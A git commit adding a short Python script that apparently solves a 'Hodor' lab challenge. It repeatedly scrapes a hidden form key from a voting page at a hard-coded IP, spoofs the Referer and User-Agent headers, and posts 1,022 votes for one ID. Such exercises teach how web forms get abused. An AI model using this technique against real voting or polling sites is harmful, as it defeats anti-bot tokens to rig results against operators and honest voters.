b70cdf5e1e99f321e8c0455bd78421d60a72818a
Nachop51 <nachoperalta0@gmail.com>
2022-06-04 00:49:08 +0000

    level 2 hodor

---
+++ level_2/main.py
@@ -0,0 +1,34 @@
+#!/usr/bin/python3
+import requests
+from bs4 import BeautifulSoup
+
+url_hodor = "http://158.69.76.135/level2.php"
+
+
+def current_session(session):
+    current = session.get(url_hodor)
+    soup = BeautifulSoup(current.text, "html.parser")
+    result = soup.find_all('input', {'type': 'hidden'})
+    return {
+        "session": {
+            "id": "4386",
+            "holdthedoor": "Submit",
+            "key": result[0].get("value"),
+        },
+        "headers": {
+            "referer": url_hodor,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+        }
+    }
+
+
+with requests.session() as session:
+    for i in range(1022):
+        data = current_session(session)
+        res = session.post(
+            url=url_hodor,
+            data=data["session"],
+            headers=data["headers"],
+        )
+        # print(res.text)
+        print(f"Vote count:{i + 1}")
